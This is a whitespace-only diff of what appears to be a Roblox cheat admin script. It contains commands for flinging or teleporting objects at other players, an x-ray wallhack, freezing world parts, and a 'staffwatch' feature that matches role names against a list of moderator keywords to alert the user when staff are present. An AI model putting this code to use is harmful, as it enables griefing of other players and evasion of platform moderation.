-    execCmd(walkflinging and "unwalkfling" or "walkfling")
+	execCmd(walkflinging and "unwalkfling" or "walkfling")
 end)
 
 addcmd('invisfling',{},function(args, speaker)
@@ -11571,32 +11575,32 @@ addcmd('invisfling',{},function(args, speaker)
 end)
 
 addcmd("antifling", {}, function(args, speaker)
-    if antifling then
-        antifling:Disconnect()
-        antifling = nil
-    end
-    antifling = RunService.Stepped:Connect(function()
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= speaker and player.Character then
-                for _, v in pairs(player.Character:GetDescendants()) do
-                    if v:IsA("BasePart") then
-                        v.CanCollide = false
-                    end
-                end
-            end
-        end
-    end)
+	if antifling then
+		antifling:Disconnect()
+		antifling = nil
+	end
+	antifling = RunService.Stepped:Connect(function()
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= speaker and player.Character then
+				for _, v in pairs(player.Character:GetDescendants()) do
+					if v:IsA("BasePart") then
+						v.CanCollide = false
+					end
+				end
+			end
+		end
+	end)
 end)
 
 addcmd("unantifling", {}, function(args, speaker)
-    if antifling then
-        antifling:Disconnect()
-        antifling = nil
-    end
+	if antifling then
+		antifling:Disconnect()
+		antifling = nil
+	end
 end)
 
 addcmd("toggleantifling", {}, function(args, speaker)
-    execCmd(antifling and "unantifling" or "antifling")
+	execCmd(antifling and "unantifling" or "antifling")
 end)
 
 function attach(speaker,target)
@@ -11836,42 +11840,42 @@ end)
 
 xrayEnabled = false
 xray = function()
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("BasePart") and not v.Parent:FindFirstChildWhichIsA("Humanoid") and not v.Parent.Parent:FindFirstChildWhichIsA("Humanoid") then
-            v.LocalTransparencyModifier = xrayEnabled and 0.5 or 0
-        end
-    end
+	for _, v in pairs(workspace:GetDescendants()) do
+		if v:IsA("BasePart") and not v.Parent:FindFirstChildWhichIsA("Humanoid") and not v.Parent.Parent:FindFirstChildWhichIsA("Humanoid") then
+			v.LocalTransparencyModifier = xrayEnabled and 0.5 or 0
+		end
+	end
 end
 
 addcmd("xray", {}, function(args, speaker)
-    xrayEnabled = true
-    xray()
+	xrayEnabled = true
+	xray()
 end)
 
 addcmd("unxray", {"noxray"}, function(args, speaker)
-    xrayEnabled = false
-    xray()
+	xrayEnabled = false
+	xray()
 end)
 
 addcmd("togglexray", {}, function(args, speaker)
-    xrayEnabled = not xrayEnabled
-    xray()
+	xrayEnabled = not xrayEnabled
+	xray()
 end)
 
 addcmd("loopxray", {}, function(args, speaker)
-    if xrayLoop then
-        xrayLoop:Disconnect()
-    end
-    xrayLoop = RunService.RenderStepped:Connect(function()
-        xrayEnabled = true
-        xray()
-    end)
+	if xrayLoop then
+		xrayLoop:Disconnect()
+	end
+	xrayLoop = RunService.RenderStepped:Connect(function()
+		xrayEnabled = true
+		xray()
+	end)
 end)
 
 addcmd("unloopxray", {}, function(args, speaker)
-    if xrayLoop then
-        xrayLoop:Disconnect()
-    end
+	if xrayLoop then
+		xrayLoop:Disconnect()
+	end
 end)
 
 local walltpTouch = nil
@@ -12088,73 +12092,73 @@ RolewatchConnection = Players.PlayerAdded:Connect(function(player)
 end)
 
 addcmd("rolewatch", {}, function(args, speaker)
-    local groupId = tonumber(args[1] or 0)
-    local roleName = args[2] and tostring(getstring(2))
-    if groupId and roleName then
-        RolewatchData.Group = groupId
-        RolewatchData.Role = roleName
-        notify("Rolewatch", "Watching Group ID \"" .. tostring(groupId) .. "\" for Role \"" .. roleName .. "\"")
-    end
+	local groupId = tonumber(args[1] or 0)
+	local roleName = args[2] and tostring(getstring(2))
+	if groupId and roleName then
+		RolewatchData.Group = groupId
+		RolewatchData.Role = roleName
+		notify("Rolewatch", "Watching Group ID \"" .. tostring(groupId) .. "\" for Role \"" .. roleName .. "\"")
+	end
 end)
 
 addcmd("rolewatchstop", {}, function(args, speaker)
-    RolewatchData.Group = 0
-    RolewatchData.Role = ""
-    RolewatchData.Leave = false
-    notify("Rolewatch", "Disabled")
+	RolewatchData.Group = 0
+	RolewatchData.Role = ""
+	RolewatchData.Leave = false
+	notify("Rolewatch", "Disabled")
 end)
 
 addcmd("rolewatchleave", {"unrolewatch"}, function(args, speaker)
-    RolewatchData.Leave = not RolewatchData.Leave
-    notify("Rolewatch", RolewatchData.Leave and "Leave has been Enabled" or "Leave has been Disabled")
+	RolewatchData.Leave = not RolewatchData.Leave
+	notify("Rolewatch", RolewatchData.Leave and "Leave has been Enabled" or "Leave has been Disabled")
 end)
 
 staffRoles = {"mod", "admin", "staff", "dev", "founder", "owner", "supervis", "manager", "management", "executive", "president", "chairman", "chairwoman", "chairperson", "director"}
 
 getStaffRole = function(player)
-    local playerRole = player:GetRoleInGroup(game.CreatorId)
-    local result = {Role = playerRole, Staff = false}
-    for _, role in pairs(staffRoles) do
-        if string.find(string.lower(playerRole), role) then
-            result.Staff = true
-        end
-    end
-    return result
+	local playerRole = player:GetRoleInGroup(game.CreatorId)
+	local result = {Role = playerRole, Staff = false}
+	for _, role in pairs(staffRoles) do
+		if string.find(string.lower(playerRole), role) then
+			result.Staff = true
+		end
+	end
+	return result
 end
 
 addcmd("staffwatch", {}, function(args, speaker)
-    if staffwatchjoin then
-        staffwatchjoin:Disconnect()
-    end
-    if game.CreatorType == Enum.CreatorType.Group then
-        local found = {}
-        staffwatchjoin = Players.PlayerAdded:Connect(function(player)
-            local result = getStaffRole(player)
-            if result.Staff then
-                notify("Staffwatch", formatUsername(player) .. " is a " .. result.Role)
-            end
-        end)
-        for _, player in pairs(Players:GetPlayers()) do
-            local result = getStaffRole(player)
-            if result.Staff then
-                table.insert(found, formatUsername(player) .. " is a " .. result.Role)
-            end
-        end
-        if #found > 0 then
-            notify("Staffwatch", table.concat(found, ",\n"))
-        else
-            notify("Staffwatch", "Enabled")
-        end
-    else
-        notify("Staffwatch", "Game is not owned by a Group")
-    end
+	if staffwatchjoin then
+		staffwatchjoin:Disconnect()
+	end
+	if game.CreatorType == Enum.CreatorType.Group then
+		local found = {}
+		staffwatchjoin = Players.PlayerAdded:Connect(function(player)
+			local result = getStaffRole(player)
+			if result.Staff then
+				notify("Staffwatch", formatUsername(player) .. " is a " .. result.Role)
+			end
+		end)
+		for _, player in pairs(Players:GetPlayers()) do
+			local result = getStaffRole(player)
+			if result.Staff then
+				table.insert(found, formatUsername(player) .. " is a " .. result.Role)
+			end
+		end
+		if #found > 0 then
+			notify("Staffwatch", table.concat(found, ",\n"))
+		else
+			notify("Staffwatch", "Enabled")
+		end
+	else
+		notify("Staffwatch", "Game is not owned by a Group")
+	end
 end)
 
 addcmd("unstaffwatch", {}, function(args, speaker)
-    if staffwatchjoin then
-        staffwatchjoin:Disconnect()
-    end
-    notify("Staffwatch", "Disabled")
+	if staffwatchjoin then
+		staffwatchjoin:Disconnect()
+	end
+	notify("Staffwatch", "Disabled")
 end)
 
 addcmd('removeterrain',{'rterrain','noterrain'},function(args, speaker)
@@ -12190,104 +12194,104 @@ end)
 local freezingua = nil
 frozenParts = {}
 addcmd('freezeunanchored',{'freezeua'},function(args, speaker)
-    local badnames = {
-        "Head",
-        "UpperTorso",
-        "LowerTorso",
-        "RightUpperArm",
-        "LeftUpperArm",
-        "RightLowerArm",
-        "LeftLowerArm",
-        "RightHand",
-        "LeftHand",
-        "RightUpperLeg",
-        "LeftUpperLeg",
-        "RightLowerLeg",
-        "LeftLowerLeg",
-        "RightFoot",
-        "LeftFoot",
-        "Torso",
-        "Right Arm",
-        "Left Arm",
-        "Right Leg",
-        "Left Leg",
-        "HumanoidRootPart"
-    }
-    local function FREEZENOOB(v)
-        if v:IsA("BasePart" or "UnionOperation") and v.Anchored == false then
-            local BADD = false
-            for i = 1,#badnames do
-                if v.Name == badnames[i] then
-                    BADD = true
-                end
-            end
-            if speaker.Character and v:IsDescendantOf(speaker.Character) then
-                BADD = true
-            end
-            if BADD == false then
-                for i,c in pairs(v:GetChildren()) do
-                    if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
-                        c:Destroy()
-                    end
-                end
-                local bodypos = Instance.new("BodyPosition")
-                bodypos.Parent = v
-                bodypos.Position = v.Position
-                bodypos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
-                local bodygyro = Instance.new("BodyGyro")
-                bodygyro.Parent = v
-                bodygyro.CFrame = v.CFrame
-                bodygyro.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
-                if not table.find(frozenParts,v) then
-                    table.insert(frozenParts,v)
-                end
-            end
-        end
-    end
-    for i,v in pairs(workspace:GetDescendants()) do
-        FREEZENOOB(v)
-    end
-    freezingua = workspace.DescendantAdded:Connect(FREEZENOOB)
+	local badnames = {
+		"Head",
+		"UpperTorso",
+		"LowerTorso",
+		"RightUpperArm",
+		"LeftUpperArm",
+		"RightLowerArm",
+		"LeftLowerArm",
+		"RightHand",
+		"LeftHand",
+		"RightUpperLeg",
+		"LeftUpperLeg",
+		"RightLowerLeg",
+		"LeftLowerLeg",
+		"RightFoot",
+		"LeftFoot",
+		"Torso",
+		"Right Arm",
+		"Left Arm",
+		"Right Leg",
+		"Left Leg",
+		"HumanoidRootPart"
+	}
+	local function FREEZENOOB(v)
+		if v:IsA("BasePart" or "UnionOperation") and v.Anchored == false then
+			local BADD = false
+			for i = 1,#badnames do
+				if v.Name == badnames[i] then
+					BADD = true
+				end
+			end
+			if speaker.Character and v:IsDescendantOf(speaker.Character) then
+				BADD = true
+			end
+			if BADD == false then
+				for i,c in pairs(v:GetChildren()) do
+					if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
+						c:Destroy()
+					end
+				end
+				local bodypos = Instance.new("BodyPosition")
+				bodypos.Parent = v
+				bodypos.Position = v.Position
+				bodypos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
+				local bodygyro = Instance.new("BodyGyro")
+				bodygyro.Parent = v
+				bodygyro.CFrame = v.CFrame
+				bodygyro.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
+				if not table.find(frozenParts,v) then
+					table.insert(frozenParts,v)
+				end
+			end
+		end
+	end
+	for i,v in pairs(workspace:GetDescendants()) do
+		FREEZENOOB(v)
+	end
+	freezingua = workspace.DescendantAdded:Connect(FREEZENOOB)
 end)
 
 addcmd('thawunanchored',{'thawua','unfreezeunanchored','unfreezeua'},function(args, speaker)
-    if freezingua then
-        freezingua:Disconnect()
-    end
-    for i,v in pairs(frozenParts) do
-        for i,c in pairs(v:GetChildren()) do
-            if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
-                c:Destroy()
-            end
-        end
-    end
-    frozenParts = {}
+	if freezingua then
+		freezingua:Disconnect()
+	end
+	for i,v in pairs(frozenParts) do
+		for i,c in pairs(v:GetChildren()) do
+			if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
+				c:Destroy()
+			end
+		end
+	end
+	frozenParts = {}
 end)
 
 addcmd('tpunanchored',{'tpua'},function(args, speaker)
-    local players = getPlayer(args[1], speaker)
-    for i,v in pairs(players) do
-        local Forces = {}
-        for _,part in pairs(workspace:GetDescendants()) do
-            if Players[v].Character:FindFirstChild('Head') and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(speaker.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
-                for i,c in pairs(part:GetChildren()) do
-                    if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
-                        c:Destroy()
-                    end
-                end
-                local ForceInstance = Instance.new("BodyPosition")
-                ForceInstance.Parent = part
-                ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-                table.insert(Forces, ForceInstance)
-                if not table.find(frozenParts,part) then
-                    table.insert(frozenParts,part)
-                end
-            end
-        end
-        for i,c in pairs(Forces) do
-            c.Position = Players[v].Character.Head.Position
-        end
-    end
+	local players = getPlayer(args[1], speaker)
+	for i,v in pairs(players) do
+		local Forces = {}
+		for _,part in pairs(workspace:GetDescendants()) do
+			if Players[v].Character:FindFirstChild('Head') and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(speaker.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
+				for i,c in pairs(part:GetChildren()) do
+					if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
+						c:Destroy()
+					end
+				end
+				local ForceInstance = Instance.new("BodyPosition")
+				ForceInstance.Parent = part
+				ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+				table.insert(Forces, ForceInstance)
+				if not table.find(frozenParts,part) then
+					table.insert(frozenParts,part)
+				end
+			end
+		end
+		for i,c in pairs(Forces) do
+			c.Position = Players[v].Character.Head.Position
+		end
+	end
 end)
 
 keycodeMap = {
